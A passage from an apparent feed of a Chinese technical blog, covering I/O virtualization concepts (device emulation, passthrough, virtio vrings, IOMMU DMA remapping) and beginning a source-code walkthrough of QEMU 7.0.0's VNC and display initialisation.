来完成的，因而针对外设的虚拟化称之为 <strong>I&#x2F;O 虚拟化</strong></p><p>I&#x2F;O 虚拟化需要实现以下三个任务：</p><ul><li>访问截获：Hypervisor 需要截获 VM 对外设的访问操作</li><li>提供设备接口：Hypervisor 需要为 VM 提供虚拟&#x2F;直通设备的接口</li><li>实现设备功能：Hypervisor 需要实现虚拟设备的功能</li></ul><h2 id="一、I-x2F-O-虚拟化基本模型"><a href="#一、I-x2F-O-虚拟化基本模型" class="headerlink" title="一、I&#x2F;O 虚拟化基本模型"></a>一、I&#x2F;O 虚拟化基本模型</h2><blockquote><p>这一节其实是笔者不记得不知道什么时候出于什么目的从<a href="https://developer.ibm.com/tutorials/l-pci-passthrough/">https://developer.ibm.com/tutorials/l-pci-passthrough/</a>上翻译了一段存在草稿箱里，最近翻草稿箱发现之前居然还留存有这种东西，所以修改一下就放上来了XD</p></blockquote><h3 id="I-平台设备模拟（Platform-device-emulation）"><a href="#I-平台设备模拟（Platform-device-emulation）" class="headerlink" title="I.平台设备模拟（Platform device emulation）"></a>I.平台设备模拟（Platform device emulation）</h3><p>QEMU 和 VMWare 都选择了仿真出一个虚拟设备，不同在于其模拟设备的实现方式。</p><h4 id="基于虚拟机管理程序的设备模拟（Hypervisor-based-device-emulation）"><a href="#基于虚拟机管理程序的设备模拟（Hypervisor-based-device-emulation）" class="headerlink" title="基于虚拟机管理程序的设备模拟（Hypervisor-based device emulation）"></a>基于虚拟机管理程序的设备模拟（Hypervisor-based device emulation）</h4><p>在 hypervisor （虚拟机管理程序）中对设备进行仿真是 VMware workstation 系列产品较为常用的一种方式：在 hypervisor 中有着对一般设备的仿真供 guest OS 进行共享，包括虚拟磁盘、虚拟网络适配器与其他的必要元素，这种模型如下图所示：</p><p><img src="https://s2.loli.net/2022/02/25/IQduvSe7wE4TLgq.png" alt="image.png"></p><h4 id="在用户空间进行设备模拟（User-space-device-emulation）"><a href="#在用户空间进行设备模拟（User-space-device-emulation）" class="headerlink" title="在用户空间进行设备模拟（User space device emulation）"></a>在用户空间进行设备模拟（User space device emulation）</h4><p>第二种架构称为用户空间设备模拟，正如其名，相比于在 hypervisor 中进行模拟，其选择了在用户空间进行模拟的方式。QEMU（不仅提供了设备模拟同时还有一个 hypervisor）在用户空间中独立模拟了一个设备，该模拟设备被其他的 VM 通过 hypervisor 提供的接口进行调用。由于设备的模拟是独立于 hypervisor 的，因此我们可以模拟任何设备，且该模拟设备可以在其他 hypervisor 间进行共享。</p><p><img src="https://s2.loli.net/2022/02/28/IQbMNCcDlXR4z5V.png" alt="image.png"></p><h3 id="II-设备直通（Device-passthrough）"><a href="#II-设备直通（Device-passthrough）" class="headerlink" title="II.设备直通（Device passthrough）"></a>II.设备直通（Device passthrough）</h3><p>上面的这两种模型或多或少都存在着一定的性能开销，如果该设备需要被多个 VM 共享，那这种开销或许是值得的，但如果该设备并不需要共享，那么我们其实可以使用一种更为高效的方法——设备直通（Device passthrough）。</p><h4 id="通过虚拟机管理程序进行直通（Passthrough-within-the-hypervisor）"><a href="#通过虚拟机管理程序进行直通（Passthrough-within-the-hypervisor）" class="headerlink" title="通过虚拟机管理程序进行直通（Passthrough within the hypervisor）"></a>通过虚拟机管理程序进行直通（Passthrough within the hypervisor）</h4><p>设备直通可以理解为设备独占的设备模拟：直接将设备<strong>隔离</strong>给到指定的 VM 上，以便该设备可以由该 VM 独占使用。<strong>这提供了接近于原生设备的性能</strong>，例如对于一些需要大量 IO 的设备（例如网络设备等），使用设备直通能提供相当完美的性能。</p><p>下图左半部分便为设备直通</p><p><img src="https://s2.loli.net/2022/02/28/PRSNK1g4saEjvVF.png" alt="image.png"></p><h2 id="二、软件半虚拟化-virtio"><a href="#二、软件半虚拟化-virtio" class="headerlink" title="二、软件半虚拟化 - virtio"></a>二、软件半虚拟化 - virtio</h2><p><code>virtio</code> 这个概念来自于一篇非常古老的虚拟化领域的论文：<a href="https://ozlabs.org/~rusty/virtio-spec/virtio-paper.pdf">virtio: towards a de-facto standard for virtual I&#x2F;O devices</a>，主要是为了解决设备虚拟化的问题而<strong>提供了一套通用的虚拟化设备模型</strong>，Guest OS 只需要实现一套统一的 virtio 驱动便能以统一的方式访问虚拟化设备，从而避免了各种虚拟化驱动分裂的问题</p><p><img src="https://s2.loli.net/2022/08/29/SZ2p17EtqRHoFQh.png" alt="image.png"></p><h3 id="I-VirtQueue：传输层抽象"><a href="#I-VirtQueue：传输层抽象" class="headerlink" title="I. VirtQueue：传输层抽象"></a>I. VirtQueue：传输层抽象</h3><p><code>virtqueue</code> 为 virtio 中用以进行数据传输的关键结构，其本身表示一个<strong>数据队列</strong>：由一方向队列中添加 buffer，另一方从队列中取出 buffer——通过这样的方式实现了 Guest 与 Host 之间基本的数据传输模型</p><p>为了减少模型的复杂性，通常我们使用 virtqueue 的传输都是单向的，因此一个最简单的模型就是我们就可以使用两个 virtqueue 来实现 Guest 与 Host 之间的双向通信：tx queue（发送队列） &amp; rx queue（接收队列）</p><p><img src="https://s2.loli.net/2022/08/29/g1kn2r4VWO7GBLM.png" alt="转自 LoyenWang 公众号的图片，非常清晰的表示了 virtqueue 工作原理的一张图！"></p><p>对于 virtqueue 的操作，在论文中抽象成一个函数表 <code>virtqueue_ops</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue_ops</span> &#123;</span><br>    <span class="hljs-type">int</span> (*add_buf)(<span class="hljs-keyword">struct</span> virtqueue *vq,<br>                    <span class="hljs-keyword">struct</span> scatterlist sg[],<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> out_num,<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> in_num,<br>                    <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> (*kick)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>    <span class="hljs-type">void</span> *(*get_buf)(<span class="hljs-keyword">struct</span> virtqueue *vq,<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *len);<br>    <span class="hljs-type">void</span> (*disable_cb)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>    <span class="hljs-type">bool</span> (*enable_cb)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>add_buf</code>：向 virtqueue 中添加一个 buffer</li><li><code>kick</code> ：通知另一方新到达了一个 buffer</li><li><code>get_buf</code> 从 virtqueue 中获取一个 buffer</li><li><code>disable_cb</code>：通知另一方关闭 buffer 到达的提示</li><li><code>enable_cb</code>：通知另一方开启 buffer 到达的提示</li></ul><h3 id="II-VRing：virtqueue-的基本结构"><a href="#II-VRing：virtqueue-的基本结构" class="headerlink" title="II. VRing：virtqueue 的基本结构"></a>II. VRing：virtqueue 的基本结构</h3><p>virtqueue 核心的数据结构便是 <code>vring</code>，这是一个<strong>环形缓冲区队列</strong>，其由三部分组成：</p><ul><li>描述符表（Desc）</li><li>可用描述符数组（Used）</li><li>已用描述符数组（Avail）</li></ul><p><img src="https://s2.loli.net/2022/08/29/OrlAvYaFkZ3dIXt.png" alt="image.png"></p><p>一个描述符（Descriptor）为如下结构，表示了一块 buffer 的基本属性，需要注意的是一个 Avail&#x2F;Used 表项通常是多个 descriptor 串联的 buffer——这便是 next 域的作用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_desc</span></span><br><span class="hljs-class">&#123;</span><br>    __u64 addr;<span class="hljs-comment">// Guest Physical Addresses</span><br>    __u32 len;<span class="hljs-comment">// 长度</span><br>    __u16 flags;<span class="hljs-comment">// 属性</span><br>    __u16 next;<span class="hljs-comment">// 下一个描述符的 idx</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Avail</strong> 数组用来存储当前可用的描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_avail</span></span><br><span class="hljs-class">&#123;</span><br>    __u16 flags;<br>    __u16 idx;<br>    __u16 ring[NUM];<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Used</strong> 数组则用来存储已经被使用的描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used_elem</span></span><br><span class="hljs-class">&#123;</span><br>    __u32 id;<br>    __u32 len;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used</span></span><br><span class="hljs-class">&#123;</span><br>    __u16 flags;<br>    __u16 idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used_elem</span> <span class="hljs-title">ring</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>Avail 数组与 Used 数组同样是一个<strong>环形队列</strong>，不过这两个数组分别由通信的两方进行使用：</p><ul><li>数据<strong>发送方</strong>准备好数据后从 <code>Avail 队列</code> 中获取可用的表项，更新描述符表，并在 <code>Used 队列</code> 中插入新的表项，通知接收方有数据到达</li><li>数据<strong>接收方</strong>从 <code>Used 队列</code> 中取出表项，读取描述符表以获取数据，完成处理后将表项插入到 <code>Avail 队列</code> 中</li></ul><p>下图为由 Guest 向 Host 发送数据的一个 vring 示例：</p><p><img src="https://s2.loli.net/2022/08/29/8uUq1jacyEYGlXR.png" alt="转自 LoyenWang 公众号的图片，非常清晰的表示了 virtqueue 工作原理的一张图！"></p><h3 id="III-virtio-配置操作抽象"><a href="#III-virtio-配置操作抽象" class="headerlink" title="III. virtio 配置操作抽象"></a>III. virtio 配置操作抽象</h3><p>结合 virtqueue，我们现在可以抽象出一个虚拟 PCI 设备的基本操作：</p><ul><li>获取 feature bits</li><li>读写配置空间</li><li>读写 status bits</li><li>设备重置</li><li>创建&#x2F;销毁 virtqueue</li></ul><p>我们将其抽象成一张函数表：<code>virtio_config_ops</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_config_ops</span></span><br><span class="hljs-class">&#123;</span><br>        <span class="hljs-type">bool</span> (*feature)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> bit);<br>        <span class="hljs-type">void</span> (*get)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> offset,<br>                    <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> len);<br>        <span class="hljs-type">void</span> (*<span class="hljs-built_in">set</span>)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> offset,<br>                    <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> len);<br>        u8 (*get_status)(<span class="hljs-keyword">struct</span> virtio_device *vdev);<br>        <span class="hljs-type">void</span> (*set_status)(<span class="hljs-keyword">struct</span> virtio_device *vdev, u8 status);<br>        <span class="hljs-type">void</span> (*reset)(<span class="hljs-keyword">struct</span> virtio_device *vdev);<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue</span> *(*<span class="hljs-title">find_vq</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_device</span> *<span class="hljs-title">vdev</span>,</span><br><span class="hljs-class">                                     <span class="hljs-title">unsigned</span> <span class="hljs-title">index</span>,</span><br><span class="hljs-class">                                     <span class="hljs-title">void</span> (*<span class="hljs-title">callback</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue</span> *));</span><br>        <span class="hljs-type">void</span> (*del_vq)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>feature</code>：获取设备对应的 feature bit</li><li><code>get &amp; set</code> ：读写设备的配置空间</li><li><code>get_status &amp; set_status</code>：读写设备的 status bits</li><li><code>reset</code>：重置设备</li><li><code>find_vq</code>：获取&#x2F;创建 virtqueue</li><li><code>del_vq</code>：销毁 virtqueue</li></ul><h2 id="三、IOMMU"><a href="#三、IOMMU" class="headerlink" title="三、IOMMU"></a>三、IOMMU</h2><blockquote><p>可以直接参见 <a href="https://www.intel.com/content/dam/develop/external/us/en/documents/intel-whitepaper-using-iommu-for-dma-protection-in-uefi.pdf">Intel 的手册</a></p></blockquote><p> IOMMU 即 <strong>Input&#x2F;Output Memory Management Unit</strong>，其功能类似于 CPU 中的 MMU，是一个<strong>向设备侧提供地址翻译功能的单元</strong></p><p><img src="https://s2.loli.net/2022/09/03/3GOTl4oAExSdPcL.png" alt="image.png"></p><p>IOMMU 通常被集成于北桥中，其提供面向设备端的两个功能：</p><ul><li><strong>DMA 重映射</strong>（ <strong>DMA remapping</strong>）：有着 DMA 功能的设备可以使用虚拟地址，通过 IOMMU 转换为物理地址进行直接内存访问</li><li><strong>中断重映射</strong>（<strong>Interrupt remapping</strong>）：IOMMU 会拦截设备产生的中断，根据中断重映射表产生新的中断请求发送给 LAPIC</li></ul><p><img src="https://s2.loli.net/2022/09/03/k8mOSalVRWtseMi.png" alt="image.png"></p><h3 id="I-DMA-重映射"><a href="#I-DMA-重映射" class="headerlink" title="I. DMA 重映射"></a>I. DMA 重映射</h3><p>DMA 重映射即面向设备侧的地址访问重翻译，如下图所示，左侧是 CPU 对内存的虚拟化：MMU 利用进程页表将进程要访问的虚拟地址翻译为物理地址，从而实现在两个进程中访问同一个虚拟地址实际上访问到不同的物理地址——DMA 重映射也是类似的原理，如下图右侧所示，当外设想要进行 DMA 时，IOMMU 会根据“设备页表”进行地址翻译，从而使得两个设备各自感知访问的是同一个地址，但实际上访问到了不同的物理地址</p><p><img src="https://s2.loli.net/2022/09/03/B3yxUoClVsArMGp.png" alt="image.png"></p><p>DMA 重映射有着以下的两种方式：</p><h4 id="①-Request-without-PASID"><a href="#①-Request-without-PASID" class="headerlink" title="① Request-without-PASID"></a>① Request-without-PASID</h4><p>在 IOMMU 中使用了一个“二层页表 + 标准页表”结构来实现 DMA 重映射，需要占用部分物理内存空间：</p><ul><li><strong>Root Table</strong>：存放各个 bus 的 DMA 重映射表地址，一个 entry 对应一个 bus</li><li><strong>Context Table</strong>：存放各个 domain 的 DMA 重映射表地址，一个 entry 对应一个 domain</li><li><strong>Address Translation Structure</strong>：实际的 DMA 重映射页表</li></ul><p>在 IOMMU 中的寄存器 <strong>Root Table Address Register</strong> 用以存放指向 Root-table 的指针</p><p><img src="https://s2.loli.net/2022/09/03/TdAB3Um4xhzHKXZ.png" alt="image.png"></p><p>DMA 重映射还需要一个 id 来唯一标识一个设备，对于 PCI 设备而言便是其 BDF（Bus&#x2F;Device&#x2F;Function），因此实际的地址访问过程如下图所示：</p><p><img src="https://s2.loli.net/2022/09/03/67FPkW2zafeMBpL.png" alt="知乎偷的图"></p><h4 id="②-Request-with-PASID"><a href="#②-Request-with-PASID" class="headerlink" title="② Request-with-PASID"></a>② Request-with-PASID</h4><h3 id="II-中断重映射"><a href="#II-中断重映射" class="headerlink" title="II.中断重映射"></a>II.中断重映射</h3><h3 id="III-IOMMU-与虚拟化"><a href="#III-IOMMU-与虚拟化" class="headerlink" title="III. IOMMU 与虚拟化"></a>III. IOMMU 与虚拟化</h3><p>虽然 IOMMU 的引入增加了与外设通信间的开销，但 IOMMU 解决了系统虚拟化技术的一个难点：对于非纯模拟的设备而言，其并不知道 GPA 与 HPA 之间的映射关系，当其按 Guest OS 提供的地址进行 DMA 时<strong>会直接访问到 Host 的内存</strong></p><p>当引入了 IOMMU 之后，IOMMU 可以根据 Host 侧提供的 GPA 到 HPA 之间的地址转换表，进行<strong>DMA remapping</strong>，这样外设就能正常地访问到 Guest 的物理内存，而不会错误地访问到 Host 对应的物理内存区域</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;虚拟化方向YLG速成入门指北&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>【VIRT.0x01】Qemu - II：VNC 模块源码分析</title>
    <link href="http://blog.arttnba3.cn/2022/07/22/VIRTUALIZATION-0X01-QEMU-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/07/22/VIRTUALIZATION-0X01-QEMU-PART-II/</id>
    <published>2022-07-21T17:39:15.000Z</published>
    <updated>2022-08-19T16:32:23.907Z</updated>
    
    <content type="html"><![CDATA[<p>vnc，🐕都不用</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>VNC 即 Virtual Network Computing，是基于<strong>RFB（Remote Frame Buffer）</strong>协议进行通信的远程桌面协议，与 telnet、ssh 等相比，VNC 最大的特点便是支持图形化了，用户可以看到远程机器的图形化界面，且能使用键盘与鼠标进行输入</p><p>Qemu 虚拟机同样支持通过 VNC只需要指定 <code>-vnc</code> 参数便能够建立 VNC Server，从而使得远程用户可以通过 VNC 连接到 Qemu 虚拟机上</p><p>本篇主要是对 Qemu 中 VNC 实现的源码分析，同时也会夹杂着部分 Qemu 显示相关的分析，源码版本 Qemu 7.0.0</p><h1 id="0x01-qemu-init-displays-显示设备初始化"><a href="#0x01-qemu-init-displays-显示设备初始化" class="headerlink" title="0x01. qemu_init_displays() - 显示设备初始化"></a>0x01. qemu_init_displays() - 显示设备初始化</h1><p>我们都知道 Qemu 的入口函数是 <code>softmmu/main.c</code> 中的 <code>qemu_main()</code>，在其中会调用到 <code>sotftmmuvl.c</code> 中的 <code>qemu_init()</code> 函数进行 Qemu 的初始化工作，包括一系列的参数解析、设备初始化等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">undef</span> main</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> main qemu_main</span><br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    qemu_init(argc, argv, envp);<br>    qemu_main_loop();<br>    qemu_cleanup();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>本篇我们主要关注与 VNC 相关的内容，注意到在 <code>qemu_init()</code> 的末尾会调用到 <code>qemu_init_displays()</code> 进行显示初始化的工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_init</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    qemu_init_displays();<br>    <br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数比较简短，首先是调用 <code>init_displaystate()</code> 与 <code>qemu_display_init()</code> 对虚拟机本地的显示设备进行初始化，之后才是使用 <code>qemu_opts_foreach</code> 宏来遍历参数中与 vnc 相关的配置，最后调用到的是 <code>vnc_init_func()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">qemu_init_displays</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    DisplayState *ds;<br><br>    <span class="hljs-comment">/* 初始化本地显示 */</span><br>    ds = init_displaystate();<br>    qemu_display_init(ds, &amp;dpy);<br><br>    <span class="hljs-comment">/* 必须在终端初始化后, 由 SDL 库更改信号的 handlers */</span><br>    os_setup_signal_handling();<br><br>    <span class="hljs-comment">/* 初始化远程显示 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC</span><br>    qemu_opts_foreach(qemu_find_opts(<span class="hljs-string">&quot;vnc&quot;</span>),<br>                      vnc_init_func, <span class="hljs-literal">NULL</span>, &amp;error_fatal);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (using_spice) &#123;<br>        qemu_spice.display_init();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="〇、显示设备相关结构体"><a href="#〇、显示设备相关结构体" class="headerlink" title="〇、显示设备相关结构体"></a>〇、显示设备相关结构体</h2><p>在 Qemu 当中有着多个与显示设备相关的结构，他们之间的关系如下图所示：</p><p><img src="https://s2.loli.net/2022/07/20/FUkehDzTocbtu4O.png" alt="image.png"></p><blockquote><p>本图来自于<a href="https://www.linux-kvm.org/images/b/b2/01x10b-QEMUGfraphics.pdf">这个ppt</a></p></blockquote><h3 id="I、QemuConsole-单个控制台实例"><a href="#I、QemuConsole-单个控制台实例" class="headerlink" title="I、QemuConsole - 单个控制台实例"></a>I、QemuConsole - 单个控制台实例</h3><p>在开始分析之前我们先介绍一个新的结构体：<code>QemuConsole</code>，一个该结构体实例在 Qemu 中表示一个控制台（console）实例，对应着<strong>一个特定的 VGA 设备与一组特定的输入设备</strong>。在 Qemu 当中主要有两类控制台：图形化控制台与字符型控制台。</p><p>该结构体定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QemuConsole</span> &#123;</span><br>    Object parent;<br><br>    <span class="hljs-type">int</span> index;<br>    <span class="hljs-type">console_type_t</span> console_type; <span class="hljs-comment">// 控制台类型</span><br>    DisplayState *ds;           <span class="hljs-comment">// 对应的显示设备</span><br>    DisplaySurface *surface;<br>    DisplayScanout scanout;<br>    <span class="hljs-type">int</span> dcls;<br>    DisplayGLCtx *gl;<br>    <span class="hljs-type">int</span> gl_block;<br>    QEMUTimer *gl_unblock_timer;<br>    <span class="hljs-type">int</span> window_id;<br><br>    <span class="hljs-comment">/* 图形化控制台状态.  */</span><br>    Object *device; <span class="hljs-comment">// 对应的图形化设备</span><br>    <span class="hljs-type">uint32_t</span> head;<br>    QemuUIInfo ui_info;<br>    QEMUTimer *ui_timer;  <span class="hljs-comment">// 对应的 Timer</span><br>    <span class="hljs-type">const</span> GraphicHwOps *hw_ops;  <span class="hljs-comment">// 硬件操作函数</span><br>    <span class="hljs-type">void</span> *hw;<br><br>    <span class="hljs-comment">/* 字符控制台状态 */</span><br>    <span class="hljs-type">int</span> width;<br>    <span class="hljs-type">int</span> height;<br>    <span class="hljs-type">int</span> total_height;<br>    <span class="hljs-type">int</span> backscroll_height;<br>    <span class="hljs-type">int</span> x, y;<br>    <span class="hljs-type">int</span> x_saved, y_saved;<br>    <span class="hljs-type">int</span> y_displayed;<br>    <span class="hljs-type">int</span> y_base;<br>    TextAttributes t_attrib_default; <span class="hljs-comment">/* 默认字符属性 */</span><br>    TextAttributes t_attrib; <span class="hljs-comment">/* 当前活动字符属性 */</span><br>    TextCell *cells;<br>    <span class="hljs-type">int</span> text_x[<span class="hljs-number">2</span>], text_y[<span class="hljs-number">2</span>], cursor_invalidate;<br>    <span class="hljs-type">int</span> echo;<br><br>    <span class="hljs-type">int</span> update_x0;<br>    <span class="hljs-type">int</span> update_y0;<br>    <span class="hljs-type">int</span> update_x1;<br>    <span class="hljs-type">int</span> update_y1;<br><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">TTYState</span> <span class="hljs-title">state</span>;</span><br>    <span class="hljs-type">int</span> esc_params[MAX_ESC_PARAMS];<br>    <span class="hljs-type">int</span> nb_esc_params;<br><br>    Chardev *chr;<br>    <span class="hljs-comment">/* 先进先出的按键输入 */</span><br>    Fifo8 out_fifo;<br>    CoQueue dump_queue;<br><br>    QTAILQ_ENTRY(QemuConsole) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>对于图形化设备相关的操作，主要通过函数表 <code>hw_ops</code> 来完成，对于纯字符型显示设备而言，该函数表为 <code>text_console_ops</code>，对于普通的 VGA 设备而言则为 <code>vga_ops</code>，我们在后面会看到这一点。</p><p>QemuConsole 的创建主要通过 <code>new_console()</code> 来完成，在 Qemu 中有一个全局的 QemuConsole 变量 <code>consoles</code>，每当创建一个新的 QemuConsole 后就会通过尾插法插入到这个全局的 QemuConsole 链表中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-title function_">QTAILQ_HEAD</span><span class="hljs-params">(, QemuConsole)</span> consoles =<br>    QTAILQ_HEAD_INITIALIZER(consoles);<br></code></pre></td></tr></table></figure><blockquote><p>什么是 <code>console</code>？狭义地说，console 最初指的就是一个设备的控制台，<em>包含了显示设备与基本输入设备</em> ，与 terminal 不同，console 通常是机器自带的，而 terminal 则往往指的是需要我们通过串口进行连接的外部设备<br>不过随着时代的发展，现在对于 console 与 terminal 之间概念的定义区别也逐渐趋于模糊，现在的机器大都不再有实体的 console，而采用软件模拟的方式，例如在 Linux 中定义了 6 个 virtual terminal（可以使用 <code>ctrl + f1 ~ f6</code> 进行切换），而当我们向 <code>/dev/console</code> 输入时，则会输出到当前的 virtual terminal 上；而在一些其他的类 UNIX 系统中，console 则往往被固定为第一个 virtual terminal</p></blockquote><h3 id="II、DisplayState-显示设备总状态"><a href="#II、DisplayState-显示设备总状态" class="headerlink" title="II、DisplayState - 显示设备总状态"></a>II、DisplayState - 显示设备总状态</h3><p>在 Qemu 当中使用一个 <code>DisplayState</code> 表示显示设备的总状态，该结构体定义于 <code>ui/console.c</code> 中,如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 